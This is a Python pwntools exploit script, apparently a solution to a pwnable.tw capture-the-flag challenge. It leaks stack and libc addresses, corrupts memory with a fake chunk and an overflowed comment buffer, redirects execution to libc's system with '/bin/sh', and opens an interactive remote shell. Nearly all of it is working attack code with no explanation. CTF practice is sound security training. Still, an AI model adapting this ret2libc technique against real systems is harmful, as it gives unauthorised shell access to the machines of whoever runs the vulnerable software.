from pwn import *

#s = remote('192.168.0.85',1234)
s = remote('chall.pwnable.tw', 10204)
def add(name,age,why,comment):
  s.recvuntil('name:')
  s.send(name)
  s.recvuntil('age:')
  s.send(str(age)+'\n')
  s.recvuntil('movie?')
  s.send(why)
  s.recvuntil('comment:')
  s.send(comment)
add('1234',16,'A'*0x50,'1234')
r = s.recvuntil('Comment:')
stack = u32(r[0x6c:0x6c+4])
libc = u32(r[0x74:0x78]) - 0x1b0d60 # 0x1b2d60 # <_IO_2_1_stdout_>
log.info('Stack : 0x%x'%stack)
log.info('Libc : 0x%x'%libc)
s.recvuntil('<y/n>:')
s.send('Y\n')
fake_chunk = stack - 0x60
for i in range(99):
  add('1234',16,'A'*0x18,'1234')
  s.recvuntil('<y/n>:')
  s.send('Y\n')
add('1234',16,'A'*8+p32(0)+p32(0x40)+'K'*(0x40-8)+p32(0)+p32(0x2240),'A'*(0xa8-0x54)+p32(fake_chunk))
s.recvuntil('<y/n>:')
s.send('Y\n')
# local
# system -- 0x3ada0
# /bin/sh -- 0x15b82b

# remote
# system -- 0x3a940
# /bin/sh -- 0x158e8b
add('\x00'*(0x50-0x10)+'A'*4+p32(libc+0x3a940)+'AAAA'+p32(libc+0x158e8b),16,'A','A')
s.interactive()
